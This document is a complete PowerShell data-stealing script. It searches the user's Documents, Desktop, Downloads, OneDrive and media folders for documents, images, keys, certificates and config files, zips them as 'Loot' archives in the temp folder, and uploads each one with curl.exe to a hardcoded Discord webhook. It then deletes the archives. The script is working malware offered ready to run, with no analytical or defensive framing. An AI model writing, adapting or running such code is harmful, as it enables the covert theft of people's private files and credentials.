$hookurl = "https://discord.com/api/webhooks/1374552823512957099/CQ32ium8bP8ma32V3qhWxuvyeBjRXkSEaw7PXLjDCpAU4MIIiGdUOPGQRMVvJFv_2i_t"

Function Exfiltrate {
    param ([string[]]$FileType,[string[]]$Path)

    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp\Loot$index.zip"

    if ($Path) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    } else {
        $foldersToSearch = @(
            "$env:USERPROFILE\Documents",
            "$env:USERPROFILE\Desktop",
            "$env:USERPROFILE\Downloads",
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\Pictures",
            "$env:USERPROFILE\Videos"
        )
    }

    if ($FileType) {
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @(
            "*.log", "*.db", "*.txt", "*.doc", "*.pdf",
            "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc",
            "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg",
            "*.conf", "*.wpd", "*.rft"
        )
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            try {
                $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
                foreach ($file in $files) {
                    $fileSize = $file.Length
                    if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                        $zipArchive.Dispose()
                        curl.exe -F file1=@$zipFilePath $hookurl
                        Remove-Item -Path $zipFilePath -Force
                        Start-Sleep 1
                        $index++
                        $zipFilePath = "$env:temp\Loot$index.zip"
                        $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                        $currentZipSize = 0
                    }
                    $entryName = $file.FullName.Substring($folder.Length + 1)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                    $currentZipSize += $fileSize
                }
            } catch {}
        }
    }

    $zipArchive.Dispose()
    curl.exe -F file1=@$zipFilePath $hookurl
    Remove-Item -Path $zipFilePath -Force
    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

Exfiltrate
